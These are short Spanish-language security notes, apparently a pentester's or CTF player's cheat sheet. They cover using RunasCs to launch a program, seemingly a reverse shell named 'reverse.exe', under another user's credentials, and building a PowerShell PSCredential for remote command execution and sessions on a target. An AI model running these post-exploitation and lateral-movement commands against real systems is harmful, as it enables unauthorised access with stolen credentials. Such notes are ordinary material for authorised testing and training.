# Run As C# & Lateral Movement
- RunAsCS es una herramienta de post-explotación que permite ejecutar un programa como un usuario diferente en un sistema Windows. Esto es útil para obtener acceso a recursos restringidos o para ejecutar tareas con privilegios elevados.
- Si tenemos credenciales de un usuario dentro de una maquina pero no podemos acceder a ella, podemos usar RunAsCS para ejecutar un programa como ese usuario. Esto puede ser útil para obtener acceso a recursos restringidos o para ejecutar tareas con privilegios elevados.
- [Repo](https://github.com/antonioCoco/RunasCs)
- [Como utilizar](https://arttoolkit.github.io/wadcoms/RunasCs/)
    - `.\RunasCS.exe USER PASSWORD -l 2 "c:\Users\Public\reverse.exe"`


## Set up PSCredential
- `$password = ConvertTo-SecureString "PASSWORD" -AsPlainText -Force`
- `$cred = New-Object System.Management.Automation.PSCredential("DOMAIN\USER", $password)`
    - Luego de haber seteado las credenciales podemos usar el objeto `$cred` para ejecutar comandos con esas credenciales.
- Ejemplos:
    - `Invoke-Command -ComputerName TARGET -Credential $cred -ScriptBlock {whoami}`: Ejecuta un comando remoto en el equipo objetivo con las credenciales especificadas.
    - `Enter-PSSession -ComputerName TARGET -Credential $cred`: Inicia una sesión remota en el equipo objetivo con las credenciales especificadas.